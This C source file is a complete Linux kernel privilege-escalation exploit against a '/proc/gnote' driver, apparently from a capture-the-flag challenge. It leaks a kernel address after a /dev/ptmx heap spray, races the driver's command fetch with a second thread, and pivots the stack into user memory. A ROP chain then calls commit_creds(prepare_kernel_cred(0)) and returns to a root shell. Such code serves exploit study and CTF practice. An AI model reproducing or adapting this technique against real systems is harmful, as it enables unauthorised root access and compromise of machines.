#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/timerfd.h>
#include <sys/mman.h>

#define NUM_PTMX 0x100
#define FAKE_IDX 0x80001bc
#define FAKE_IDX_STR "0x80001bc"

#define KERN_BASE (0xffff880000000000ULL)


unsigned int cmd[2];


void shell(void) {
    system("/bin/sh");
}


unsigned long long rflags;
void save_rflags(void) {
    __asm__ volatile (
            "pushf\n\t"
            "pop %0\n\t"
            : "=r"(rflags)
            );
}


void add_note(int fd, unsigned int size) {
    cmd[0] = 1;
    cmd[1] = size;
    write(fd, cmd, sizeof(cmd));
}


void select_note(int fd, unsigned int index) {
    cmd[0] = 5;
    cmd[1] = index;
    write(fd, cmd, sizeof(cmd));
}


void *race(void *arg) {
    __asm__ volatile (
            "mov eax, "FAKE_IDX_STR"\n\t"
            "loop:\n\t"
            "xchg %0, eax\n\t"
            "jmp loop\n\t"
            : "=m" (cmd[0])
            :
            : "rax"
            );
    return NULL;
}


#define MAP_SIZE 0x100000

unsigned long long offset_pivot = 0xffffffff8101992a - KERN_BASE; //: xchg eax, esp ; ret
unsigned long long offset_pop_rdi = 0xffffffff8101c20d - KERN_BASE; // : pop rdi ; ret
unsigned long long offset_mov_rdi_rax_jne_pop_rbp = 0xffffffff810a2db5 - KERN_BASE; //  : mov rdi, rax ; jne 0xffffffff810a2d9d ; pop rbp ; ret
unsigned long long offset_mov_rdi_rax_rep_pop_rbp = 0xffffffff81018eef - KERN_BASE; // : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; pop rbp ; ret
// 0xffffffff81ca325d

unsigned long long offset_pop_r11_rbp = 0xffffffff811025c8 - KERN_BASE; // : pop r11 ; pop rbp ; ret
unsigned long long offset_pop_rcx = 0xffffffff81037523 - KERN_BASE; // : pop rcx ; ret

unsigned long long offset_commit_creds = 0xffffffff81069df0 - KERN_BASE;
unsigned long long offset_prepare_kernel_cred = 0xffffffff81069fe0 - KERN_BASE;

unsigned long long offset_sysretq = 0xffffffff81600116 - KERN_BASE;


int main(void) {
    char buf[256];
    pthread_t th;

    save_rflags();

    int fd = open("/proc/gnote", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    int i;
    int ptmx_fds[NUM_PTMX];
    for (i = 0; i < NUM_PTMX; ++i) {
        ptmx_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    }
    for (i = 0; i < NUM_PTMX; ++i) {
        close(ptmx_fds[i]);
    }

    add_note(fd, 0x2c0);
    select_note(fd, 0);
    read(fd, buf, sizeof(buf));
    unsigned long long addr_kernel = *(unsigned long long *)(buf + 24) - 0x77ff81a35360;

    printf("addr_kernel = 0x%llx\n", addr_kernel);
    unsigned long long addr_pivot = addr_kernel + offset_pivot;
    unsigned long long addr_stack = addr_pivot & 0xffffffff;
    unsigned long long addr_mmap_stack = addr_stack & ~0xfff;
    unsigned long long *stack = (unsigned long long *)addr_stack;
    if (mmap((void *)addr_mmap_stack, 0x20000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != (void *)addr_mmap_stack) {
        perror("mmap");
        return 1;
    }

    // commit_creds(prepare_kernel_cred(0))
    *stack ++= addr_kernel + offset_pop_rdi;
    *stack ++= 0;
    *stack ++= addr_kernel + offset_prepare_kernel_cred;
    *stack ++= addr_kernel + offset_mov_rdi_rax_rep_pop_rbp;
    *stack ++= 0xdeadbeef;
    *stack ++= addr_kernel + offset_commit_creds;
    *stack ++= addr_kernel + offset_pop_rcx;
    *stack ++= (unsigned long long)(shell);
    *stack ++= addr_kernel + offset_pop_r11_rbp;
    *stack ++= rflags;
    *stack ++= 0xcafebabe;
    *stack ++= addr_kernel + offset_sysretq;
    *stack ++= 0ULL; // pop rax
    *stack ++= 0ULL; // pop rdi
    *stack ++= addr_stack + 0x5000; // pop rsp

    unsigned long long addr_jmp_table = 0x1000;
    unsigned long long *jmp_table;
    if ((jmp_table = mmap((void *)addr_jmp_table, MAP_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, 0x32 | MAP_POPULATE, -1, 0)) != (void *)addr_jmp_table) {
        perror("mmap");
        return 1;
    }
    for (i = 0; i < MAP_SIZE / 8; ++i) {
        *(jmp_table + i) = addr_kernel + offset_pivot;
    }

    pthread_create(&th, NULL, race, NULL);
    cmd[0] = 0;
    cmd[1] = FAKE_IDX;
    while (1) {
        write(fd, cmd, sizeof(cmd));
    }
    return 0;
}
